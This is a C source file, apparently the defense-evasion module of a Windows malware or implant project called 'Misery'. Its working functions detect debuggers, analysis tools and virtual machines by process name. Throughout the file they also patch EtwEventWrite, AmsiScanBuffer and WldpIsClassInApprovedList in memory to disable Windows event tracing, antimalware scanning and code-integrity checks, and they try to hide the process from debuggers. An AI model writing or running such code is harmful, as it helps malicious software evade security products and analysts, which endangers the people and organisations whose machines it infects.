#include "defense.h"
#include "misery_config.h"
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <ctype.h>
#include <setjmp.h>
#include <stdio.h>
#include <string.h>

/* Forward declarations */
typedef VOID (NTAPI *pEtwEventWrite)(ULONG64, PULONG64, ULONG, PVOID, PVOID);
typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, PROCESS_INFORMATION_CLASS, PVOID, ULONG);
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

static int g_defense_last_error = 0;

/* ------------------------------------------------------------------ */
/* Vectored Exception Handler — MinGW-compatible __try/__except       */
/* ------------------------------------------------------------------ */
static jmp_buf g_seh_jmp;
static bool   g_seh_armed = false;

static LONG WINAPI DefenseSehHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION &&
        g_seh_armed) {
        g_seh_armed = false;
        longjmp(g_seh_jmp, 1);   /* jump back to setjmp(0) path */
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

/* ------------------------------------------------------------------ */
/* DefenseCheckDebugger                                                */
/* ------------------------------------------------------------------ */
bool DefenseCheckDebugger(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefenseCheckDebugger: Failed to load ntdll (err: %d)", g_defense_last_error);
        return false;
    }

    pNtQueryInformationProcess pQuery = 
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!pQuery) {
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefenseCheckDebugger: NtQueryInformationProcess not found");
        return false;
    }

    DWORD_PTR pbi = 0;
    ULONG len = 0;
    NTSTATUS status = pQuery(GetCurrentProcess(), 0x7, &pbi, sizeof(pbi), &len);
    
    bool is_debugged = (status == 0 && pbi != 0);
    if (is_debugged) {
        MiseryLog(MISERY_LOG_WARN, "DefenseCheckDebugger: Debugger detected!");
        return true;
    }
    
    MiseryLog(MISERY_LOG_INFO, "DefenseCheckDebugger: Environment clean");
    return false;
}

/* ------------------------------------------------------------------ */
/* DefenseDetectAnalysisTools                                          */
/* ------------------------------------------------------------------ */
bool DefenseDetectAnalysisTools(void) {
    const char *badProcs[] = {
        "procmon.exe", "procmon64.exe",
        "procexp.exe", "procexp64.exe",
        "wireshark.exe",
        "x64dbg.exe", "x32dbg.exe",
        "ida.exe", "ida64.exe",
        "ollydbg.exe",
        "windbg.exe",
        "processhacker.exe",
        "apimonitor.exe",
        "autoruns.exe", "autoruns64.exe",
        "vmtoolsd.exe",
        "vboxservice.exe", "vboxtray.exe",
        "vmware-tray.exe",
        "qemu-ga.exe",
        NULL
    };

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefenseDetectAnalysisTools: Snapshot failed (err: %d)", g_defense_last_error);
        return false;
    }

    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    bool found = false;
    int detection_count = 0;

    if (Process32First(hSnap, &pe)) {
        do {
            for (int i = 0; badProcs[i]; i++) {
                if (_stricmp(pe.szExeFile, badProcs[i]) == 0) {
                    MiseryLog(MISERY_LOG_WARN, "DefenseDetectAnalysisTools: Found [%s] (PID: %lu)",
                        pe.szExeFile, pe.th32ProcessID);
                    found = true;
                    detection_count++;
                    break;
                }
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    
    if (found) {
        MiseryLog(MISERY_LOG_WARN, "DefenseDetectAnalysisTools: Detected %d analysis tools", detection_count);
        return true;
    }
    
    MiseryLog(MISERY_LOG_INFO, "DefenseDetectAnalysisTools: Environment clean");
    return false;
}

/* ------------------------------------------------------------------ */
/* DefenseDetectVirtualMachine                                         */
/* ------------------------------------------------------------------ */
bool DefenseDetectVirtualMachine(void) {
    const char *vmProcs[] = {
        "vmware", "vbox", "qemu", "xen",
        "vmtoolsd", "vboxservice", "qemu-ga",
        NULL
    };

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    bool found = false;

    if (Process32First(hSnap, &pe)) {
        do {
            char lower_name[256];
            strcpy_s(lower_name, sizeof(lower_name), pe.szExeFile);
            for (int i = 0; lower_name[i]; i++) lower_name[i] = tolower(lower_name[i]);
            
            for (int i = 0; vmProcs[i]; i++) {
                if (strstr(lower_name, vmProcs[i]) != NULL) {
                    MiseryLog(MISERY_LOG_WARN, "DefenseDetectVirtualMachine: Detected [%s]", pe.szExeFile);
                    found = true;
                    break;
                }
            }
            if (found) break;
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return found;
}

/* ------------------------------------------------------------------ */
/* DefensePatchETW  — RET patch on EtwEventWrite                      */
/* ------------------------------------------------------------------ */
bool DefensePatchETW(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefensePatchETW: Failed to load ntdll");
        return false;
    }

    pEtwEventWrite pEtw = (pEtwEventWrite)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) {
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefensePatchETW: EtwEventWrite not found");
        return false;
    }

    DWORD oldProtect = 0;
    if (!VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefensePatchETW: VirtualProtect failed (err: %d)", g_defense_last_error);
        return false;
    }

    BYTE ret = 0xC3;  /* RET instruction */

    PVOID vehHandle = AddVectoredExceptionHandler(1, DefenseSehHandler);
    if (!vehHandle) {
        VirtualProtect(pEtw, 1, oldProtect, &oldProtect);
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefensePatchETW: AddVectoredExceptionHandler failed");
        return false;
    }

    if (setjmp(g_seh_jmp) == 0) {
        g_seh_armed = true;
        memcpy(pEtw, &ret, 1);
        g_seh_armed = false;

        RemoveVectoredExceptionHandler(vehHandle);
        VirtualProtect(pEtw, 1, oldProtect, &oldProtect);
        MiseryLog(MISERY_LOG_INFO, "DefensePatchETW: Success");
        return true;
    } else {
        /* Exception caught — memcpy faulted (shouldn't happen after VirtualProtect) */
        g_seh_armed = false;
        RemoveVectoredExceptionHandler(vehHandle);
        VirtualProtect(pEtw, 1, oldProtect, &oldProtect);
        MiseryLog(MISERY_LOG_WARN, "DefensePatchETW: Exception during memcpy");
        return false;
    }
}

/* ------------------------------------------------------------------ */
/* DefensePatchAMSI — xor eax,eax / ret on AmsiScanBuffer             */
/* ------------------------------------------------------------------ */
bool DefensePatchAMSI(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefensePatchAMSI: amsi.dll not found");
        return false;
    }

    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefensePatchAMSI: AmsiScanBuffer not found");
        return false;
    }

    DWORD oldProtect = 0;
    if (!VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefensePatchAMSI: VirtualProtect failed");
        return false;
    }

    BYTE patch[] = { 0x31, 0xC0, 0xC3 };  /* xor eax,eax / ret */

    PVOID vehHandle = AddVectoredExceptionHandler(1, DefenseSehHandler);
    if (!vehHandle) {
        VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefensePatchAMSI: AddVectoredExceptionHandler failed");
        return false;
    }

    if (setjmp(g_seh_jmp) == 0) {
        g_seh_armed = true;
        memcpy(pAmsiScanBuffer, patch, 3);
        g_seh_armed = false;

        RemoveVectoredExceptionHandler(vehHandle);
        VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);
        MiseryLog(MISERY_LOG_INFO, "DefensePatchAMSI: Success");
        return true;
    } else {
        g_seh_armed = false;
        RemoveVectoredExceptionHandler(vehHandle);
        VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);
        MiseryLog(MISERY_LOG_WARN, "DefensePatchAMSI: Exception during memcpy");
        return false;
    }
}

/* ------------------------------------------------------------------ */
/* DefensePatchWLDP — xor eax,eax / ret on WldpIsClassInApprovedList   */
/* ------------------------------------------------------------------ */
bool DefensePatchWLDP(void) {
    HMODULE hWldp = GetModuleHandleA("wldp.dll");
    if (!hWldp) {
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefensePatchWLDP: wldp.dll not found");
        return false;
    }

    FARPROC pWldpIsClassInApprovedList = GetProcAddress(hWldp, "WldpIsClassInApprovedList");
    if (!pWldpIsClassInApprovedList) {
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefensePatchWLDP: WldpIsClassInApprovedList not found");
        return false;
    }

    DWORD oldProtect = 0;
    if (!VirtualProtect(pWldpIsClassInApprovedList, 3, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefensePatchWLDP: VirtualProtect failed");
        return false;
    }

    BYTE patch[] = { 0x31, 0xC0, 0xC3 };

    PVOID vehHandle = AddVectoredExceptionHandler(1, DefenseSehHandler);
    if (!vehHandle) {
        VirtualProtect(pWldpIsClassInApprovedList, 3, oldProtect, &oldProtect);
        g_defense_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "DefensePatchWLDP: AddVectoredExceptionHandler failed");
        return false;
    }

    if (setjmp(g_seh_jmp) == 0) {
        g_seh_armed = true;
        memcpy(pWldpIsClassInApprovedList, patch, 3);
        g_seh_armed = false;

        RemoveVectoredExceptionHandler(vehHandle);
        VirtualProtect(pWldpIsClassInApprovedList, 3, oldProtect, &oldProtect);
        MiseryLog(MISERY_LOG_INFO, "DefensePatchWLDP: Success");
        return true;
    } else {
        g_seh_armed = false;
        RemoveVectoredExceptionHandler(vehHandle);
        VirtualProtect(pWldpIsClassInApprovedList, 3, oldProtect, &oldProtect);
        MiseryLog(MISERY_LOG_WARN, "DefensePatchWLDP: Exception during memcpy");
        return false;
    }
}

/* ------------------------------------------------------------------ */
/* DefenseHideFromDebugger — ProcessDynamicEHContinuationTarget (0x11) */
/* ------------------------------------------------------------------ */
bool DefenseHideFromDebugger(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    pNtSetInformationProcess pNtSetInfo = 
        (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
    if (!pNtSetInfo) return false;

    DWORD hide = 1;
    NTSTATUS status = pNtSetInfo(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)0x11, &hide, sizeof(hide));
    
    if (status != 0) {
        MiseryLog(MISERY_LOG_WARN, "DefenseHideFromDebugger: NtSetInformationProcess failed (status: 0x%lX)", status);
        return false;
    }

    MiseryLog(MISERY_LOG_INFO, "DefenseHideFromDebugger: Success");
    return true;
}

/* ------------------------------------------------------------------ */
/* DefenseHideProcessFromToolhelp                                      */
/* ------------------------------------------------------------------ */
bool DefenseHideProcessFromToolhelp(void) {
    MiseryLog(MISERY_LOG_INFO, "DefenseHideProcessFromToolhelp: Requires kernel support (skipping)");
    return false;
}

/* ------------------------------------------------------------------ */
/* Utility                                                             */
/* ------------------------------------------------------------------ */
void DefenseResetSecurityChecks(void) {
    g_defense_last_error = 0;
}

int DefenseGetLastError(void) {
    return g_defense_last_error;
}